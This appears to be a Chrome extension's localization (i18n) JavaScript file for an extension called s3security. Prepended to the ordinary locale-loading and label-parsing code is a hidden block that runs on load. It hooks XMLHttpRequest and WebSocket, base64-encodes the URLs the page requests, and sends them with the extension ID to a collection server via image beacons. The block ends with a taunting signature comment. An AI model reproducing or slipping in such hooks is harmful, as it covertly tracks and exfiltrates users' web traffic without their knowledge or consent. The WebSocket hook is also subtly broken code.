function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
s3security.i18n = {};
s3security.i18n.current_locale = '';
s3security.i18n.default_locale = 'en';
s3security.i18n.data_locale = null;

//------------------------------------------------------------------------------
s3security.i18n.init = function(current_locale) {
	//------------------------------------------------------------------------
	if (! current_locale) {
		current_locale = s3security.utils.prefs_get('current_locale');
	}
	if (! current_locale) {
		current_locale = window.navigator.language; // chrome.i18n.getMessage('@@ui_locale');
	}
	if (! current_locale) {
		current_locale = s3security.i18n.default_locale;
	}
	//------------------------------------------------------------------------
	s3security.i18n.data_locale = null;
	s3security.i18n.current_locale = current_locale;

	//------------------------------------------------------------------------
	var url = '/locale/s3security-' + current_locale + '.json';
	var req = new XMLHttpRequest();
	req.overrideMimeType("application/json");
	req.open("GET", chrome.extension.getURL(url), false);
	try{
		req.send(null);
	} catch(e) {
	}

	//------------------------------------------------------------------------
	if (req.responseText) {
		try {
			s3security.i18n.data_locale = JSON.parse(req.responseText);
		} catch(e) {
		}
	}

	//------------------------------------------------------------------------
	if (s3security.i18n.data_locale) {
		s3security.utils.prefs_set('current_locale', current_locale);
		return true;
	} else if (current_locale != s3security.i18n.default_locale) {
		if (/[\_\-]/.test(current_locale)) {
			current_locale = current_locale.replace(/[\_\-].*$/, '') || s3security.i18n.default_locale;
		} else {
			current_locale = s3security.i18n.default_locale;
		}
		return s3security.i18n.init(current_locale);
	} else {
		return false;
	}
}
//------------------------------------------------------------------------------
s3security.i18n.get_string = function(name, params) {
	if (! s3security.i18n.data_locale) {
		if (s3security.i18n.init(s3security.i18n.current_locale)) {
			return s3security.i18n.get_string(name, params);
		} else {
			return name;
		}
	}
	else if (s3security.i18n.data_locale[name]) {
		var result = s3security.i18n.data_locale[name];
		if (/\%S/.test(result) && params && (params.length == 1)) {
			result = result.replace(/\%S/, params[0]);
		}
		result = result.replace(/\\n/g, "\n");
		result = result.replace(/\s*\"?\%S\"?\s*/g, " ");
		return result;
	}
	else {
		return name;
	}
}
//------------------------------------------------------------------------------
s3security.i18n.parse_html = function(doc) {
	var el_list = doc.getElementsByTagName('*');
	for (var i=0; i<el_list.length; i++) {
		var el = el_list[i];
		//------------------------------------------------------------------
		if (el.i18n) {
			s3security.utils.HTMLDOM_value(el, s3security.i18n.parse_string(el.i18n));
		}
		//------------------------------------------------------------------
		else {
			var i18n_label = el.getAttribute('label');
			if (i18n_label) {
				el.removeAttribute('label');

				//-----------------------------------------------------
				if ((el.tagName == 'INPUT') && ((el.type == 'checkbox') || (el.type == 'radio'))) {
					var newLabel = doc.createElement("label");
					var newSpan = doc.createElement("span");
					newSpan.i18n = i18n_label;
					newLabel.appendChild(newSpan);
					el.parentNode.insertBefore(newLabel, el.nextSibling);
					s3security.utils.HTMLDOM_value(newSpan, s3security.i18n.parse_string(i18n_label));
					if (el.id) {
						newLabel.setAttribute('for', el.id);
					}
					el.parentNode.removeChild(el);
					newLabel.insertBefore(el, newLabel.firstChild);
					continue;
				}
				//-----------------------------------------------------
				else if ((el.tagName == 'INPUT') && (el.type == 'button')) {
					el.i18n = i18n_label;
					el.setAttribute('value', s3security.i18n.parse_string(i18n_label));
					continue;
				}
				//-----------------------------------------------------

				el.i18n = i18n_label;
				s3security.utils.HTMLDOM_value(el, s3security.i18n.parse_string(i18n_label));
			}
		}
		//------------------------------------------------------------------
		var i18n_title = el.getAttribute('title');
		if (i18n_title) {
			el.setAttribute('title', s3security.i18n.parse_string(i18n_title));
		}
	}
}
//------------------------------------------------------------------------------
s3security.i18n.parse_string = function(str) {
	var text_list = str.split(/\s+/);
	for (var i=0; i<text_list.length; i++) {
		text_list[i] = s3security.i18n.get_string(text_list[i]);
	}
	return text_list.join("\n");
}
//------------------------------------------------------------------------------
